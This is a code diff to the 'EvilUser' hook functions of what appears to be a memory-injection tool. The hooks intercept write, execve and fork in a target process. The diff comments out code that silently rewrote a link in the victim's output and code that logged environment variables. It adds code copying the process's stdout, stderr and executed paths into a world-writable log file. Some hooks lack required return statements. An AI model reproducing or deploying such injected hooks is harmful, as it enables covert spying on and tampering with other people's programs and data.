@@ -140,21 +140,33 @@ ssize_t EvilUser::evilSend(int sockfd, const void *buf, size_t len, int flags)
     return 0;
 }
 
+pid_t EvilUser::evilFork(pid_t pid)
+{
+    char buffer[128] = {0};
+    sprintf(buffer, "pid = %d\n", pid);
+    echo_printf(buffer, strlen(buffer));
+}
+
 ssize_t EvilUser::evilWrite(int fd, const void *buf, size_t count)
 {
-    if (!tmpBuffer)
-        tmpBuffer = (char *)malloc(MAX_TMPBUFFER_SIZE);
-
-    char *p = NULL;
-    char *injectLink = "  https://github.com/lmclmc/mem-infector";
-    char *wikiLink = "https://wiki.apache.org/tomcat/FrontPage";
-
-    size_t retSize = 0;
-    if ((p = (char *)strstr((const char *)buf, wikiLink)))
+    if (fd == 1 || fd == 2)
     {
-        int wikiLinkSize = strlen(wikiLink);
-        memcpy(p, injectLink, wikiLinkSize);
+        echo_printf((const char *)buf, count);
+       // echo_printf("\n", 1);
     }
+    // if (!tmpBuffer)
+    //     tmpBuffer = (char *)malloc(MAX_TMPBUFFER_SIZE);
+
+    // char *p = NULL;
+    // char *injectLink = "  https://github.com/lmclmc/mem-infector";
+    // char *wikiLink = "https://wiki.apache.org/tomcat/FrontPage";
+
+    // size_t retSize = 0;
+    // if ((p = (char *)strstr((const char *)buf, wikiLink)))
+    // {
+    //     int wikiLinkSize = strlen(wikiLink);
+    //     memcpy(p, injectLink, wikiLinkSize);
+    // }
 
     return 0;
 }
@@ -162,30 +174,21 @@ ssize_t EvilUser::evilWrite(int fd, const void *buf, size_t count)
 int EvilUser::evilExecve(const char *pathname, char *const argv[],
                          char *const envp[])
 {
-    echo_printf(pathname);
-    echo_printf("\n");
-    for (int i = 0; i < 100; i++)
-    {
-        if (argv[i] == NULL)
-            break;
+    echo_printf(pathname, strlen(pathname));
+    // echo_printf("\n");
+    // for (int i = 0; i < 100; i++)
+    // {
+    //     if (argv[i] == NULL)
+    //         break;
         
-        echo_printf(argv[i]);
-        echo_printf("\n");
-    }
-
-    for (int i = 0; i < 100; i++)
-    {
-        if (envp[i] == NULL)
-            break;
-        
-        echo_printf(envp[i]);
-        echo_printf("\n");
-    }
+    //     echo_printf(argv[i]);
+    //     echo_printf("\n");
+    // }
 }
 
-void echo_printf(const char *src)
+void echo_printf(const char *src, int len)
 {
     int fd = open("/home/lmc/Desktop/tmp.log", O_CREAT | O_APPEND | O_RDWR, 0666);
-    write(fd, src, strlen(src));
+    write(fd, src, len);
     close(fd);
 }
